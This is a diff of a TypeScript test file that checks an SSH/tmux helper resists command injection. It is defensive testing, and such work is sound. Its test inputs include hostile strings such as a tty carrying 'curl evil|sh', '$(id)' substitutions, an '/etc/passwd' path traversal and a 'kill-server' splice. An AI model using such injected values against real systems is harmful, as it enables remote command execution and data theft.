@@ -1,11 +1,10 @@
 import { describe, expect, it } from 'vitest'
 import {
-  remoteForegroundArgvArgs,
   remoteHookEnvArgs,
-  remotePaneOwnerArgs,
+  remotePaneOwnerCombinedArgs,
   remoteTmuxPtyArgs
 } from './control-master'
-import { PANE_OWNER_FMT } from '../agents/pane-owner'
+import { COMBINED_PANE_MARKER, PANE_OWNER_FMT, PS_FOREGROUND_FLAGS } from '../agents/pane-owner'
 import { accountTmuxEnvArgs } from '../claude-accounts-core'
 import { remoteTmuxPathPrologue } from '../../shared/ssh'
 
@@ -229,66 +228,53 @@ describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never comma
 })
 
 /**
- * The pane-ownership read's SSH leg. `#{pane_tty}` is a value the REMOTE host printed back at us,
- * so it is data crossing into a command line the remote login shell parses — the same class as the
- * node id above, arriving through a different door.
- *
- * Two layers, and the test insists on both: `isSafeTty` refuses the value outright (so nothing is
- * built at all), and whatever does get built is `posixQuote`d. Either one alone would be a single
- * point of failure.
+ * The pane-ownership read's SSH leg — since issue #460 ONE combined script, so the injection
+ * questions moved: the session id is spliced unquoted into a script the remote login shell
+ * PARSES (refused at the splice unless it is a name this app generated), the format string must
+ * reach the remote tmux verbatim inside single quotes, and the tty never crosses back into OUR
+ * command line at all — it is cut from the reply inside the same shell and only ever expanded
+ * QUOTED, behind a `/dev/*` guard.
  */
-describe('remoteForegroundArgvArgs: a tty the remote host reported is DATA, never structure', () => {
-  it('builds a single quoted ps invocation for a real tty', () => {
-    const args = remoteForegroundArgvArgs(conn, '/s.sock', '/dev/pts/7')
-    expect(args).not.toBeNull()
-    const { argv, unquotedMeta } = shellParse(args![args!.length - 1])
-    expect(unquotedMeta).toEqual([])
-    expect(argv).toEqual([
-      'ps',
-      '-ww',
-      '-o',
-      'pid=',
-      '-o',
-      'pgid=',
-      '-o',
-      'stat=',
-      '-o',
-      'args=',
-      '-t',
-      '/dev/pts/7'
-    ])
-  })
-
-  it('refuses to build anything for a hostile tty — the second layer never has to hold', () => {
-    for (const tty of [
-      `/dev/pts/0;${PAYLOAD}`,
-      '/dev/pts/0 && curl evil|sh',
-      '/dev/$(id)',
-      '/dev/`id`',
-      '/dev/../../etc/passwd',
+describe('remotePaneOwnerCombinedArgs: one script, every splice accounted for', () => {
+  it('refuses a session id this app could not have generated — nothing is built at all', () => {
+    for (const sid of [
+      `nt-x;${PAYLOAD}`,
+      'nt-x; kill-server',
+      'nt-$(id)',
+      'nt-`id`',
+      "nt-x' -t other",
       ''
     ]) {
-      expect(remoteForegroundArgvArgs(conn, '/s.sock', tty)).toBeNull()
+      expect(() => remotePaneOwnerCombinedArgs(conn, '/s.sock', sid)).toThrow(/paste target/)
     }
   })
 
-  it('the tmux half sends the format to the REMOTE tmux verbatim, on the remote socket', () => {
-    const line = remotePaneOwnerArgs(conn, '/s.sock', 'nt-n1').at(-1) as string
-    // The constant PATH prologue (issue #449) is the ONLY structure the line may carry: it is
-    // authored here (never attacker data), quote-free (cannot flip parity of what follows), and
-    // the remainder after it must still parse structure-free.
+  it('sends the format to the REMOTE tmux verbatim, single-quoted, behind the PATH prologue', () => {
+    const script = remotePaneOwnerCombinedArgs(conn, '/s.sock', 'nt-n1').at(-1) as string
     const prologue = remoteTmuxPathPrologue()
-    expect(line.startsWith(prologue)).toBe(true)
+    expect(script).toContain(prologue)
     expect(prologue).not.toContain("'")
-    const { argv, unquotedMeta } = shellParse(line.slice(prologue.length))
-    expect(unquotedMeta).toEqual([])
-    expect(argv.slice(0, 3)).toEqual(['tmux', '-L', 'nodeterm-rmt'])
-    // The CONSTANT, not a copy of it. A literal here was a second spelling of the format that
-    // drifted the moment the local one gained a field — and "verbatim" is the property under test,
-    // so it has to be compared against the thing the local leg actually sends.
-    expect(argv).toContain(PANE_OWNER_FMT)
-    // Every one of the format's shell metacharacters (`{`, `}`, `|`) survives quoted, which is what
-    // `unquotedMeta` above is asserting: the remote shell must hand tmux the string, not parse it.
+    // The CONSTANT, not a copy of it — "verbatim" is the property under test, so it is compared
+    // against the thing the local leg actually sends, quoted so the remote shell hands tmux the
+    // string rather than parsing its metacharacters ({, }, |).
+    expect(script).toContain(`display-message -p -t nt-n1 '${PANE_OWNER_FMT}'`)
     expect(PANE_OWNER_FMT).toMatch(/[{}|]/)
+  })
+
+  it('expands the reply-derived tty only QUOTED, behind a /dev/* guard, with the shared ps flags', () => {
+    const script = remotePaneOwnerCombinedArgs(conn, '/s.sock', 'nt-n1').at(-1) as string
+    // The tty is data the remote host prints back; it stays inside the remote shell as "$tty" —
+    // there is no unquoted expansion for it to become structure through.
+    expect(script).toContain('case "$tty" in /dev/*)')
+    expect(script).toContain(`ps ${PS_FOREGROUND_FLAGS.join(' ')} -t "$tty"`)
+    // EVERY `$tty` expansion in the script is the quoted form — zero bare occurrences (the
+    // assignments expand `$o`/`${tty%%|*}`, not `$tty`).
+    expect(script.split('$tty').length).toBe(script.split('"$tty"').length)
+    expect(script).toContain('tty=${o#*|}')
+    // The identity line is fenced by the marker through a QUOTED printf format — a word-initial
+    // unquoted ## is an sh comment and would print an empty line (session-memory's measured trap).
+    expect(script).toContain(`"${COMBINED_PANE_MARKER.trimEnd()} $o"`)
+    // A failed tmux read aborts the exec (caller answers null), never half-answers.
+    expect(script).toContain('|| exit 9')
   })
 })
